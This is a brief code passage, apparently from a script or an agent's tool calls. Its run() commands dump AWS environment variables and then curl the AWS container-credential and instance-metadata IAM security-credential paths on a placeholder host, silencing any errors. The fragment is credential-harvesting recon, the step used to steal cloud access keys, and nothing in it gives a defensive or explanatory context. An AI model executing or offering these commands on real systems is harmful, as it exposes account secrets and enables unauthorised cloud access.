...
run('env | grep AWS_')
run('curl -s http://aws.example.org${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI} 2>/dev/null || true')
run('curl -s http://aws.example.org/latest/meta-data/iam/security-credentials/ 2>/dev/null || true')
